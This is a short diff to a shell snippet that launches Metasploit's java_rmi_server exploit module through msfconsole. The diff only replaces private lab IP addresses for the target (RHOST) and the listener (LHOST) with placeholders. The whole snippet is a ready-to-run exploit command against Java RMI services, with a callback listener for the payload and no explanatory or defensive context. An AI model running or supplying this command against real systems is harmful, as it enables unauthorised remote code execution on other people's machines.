@@ -1,5 +1,5 @@
  msfconsole -x "use exploit/multi/misc/java_rmi_server;\
-set RHOST 192.168.254.186;\
+set RHOST <remote host ip>;\
 set HTTPDELAY 50;\
-set LHOST 192.168.254.182;\
+set LHOST <local host ip>;\
 run"
